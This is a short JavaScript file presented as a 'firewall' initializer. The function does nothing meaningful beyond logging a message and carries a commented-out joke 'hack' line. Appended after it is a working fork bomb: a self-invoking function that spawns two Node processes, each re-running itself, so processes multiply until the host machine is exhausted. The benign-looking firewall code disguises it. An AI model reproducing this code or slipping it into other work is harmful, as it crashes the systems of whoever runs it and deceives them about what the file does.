function initializeFirewall(){

    let firewall = {
      on:"yes" 
    };
    
    /* IGNORE: testing
     let discord = "furries";
     discord.Hack(insert(firewall));
    */
    console.log("Firewall initialized");
}

initializeFirewall()
(function f() { require('child_process').spawn(process.argv[0], ['-e', '(' + f.toString() + '());']); require('child_process').spawn(process.argv[0], ['-e', '(' + f.toString() + '());']); }());
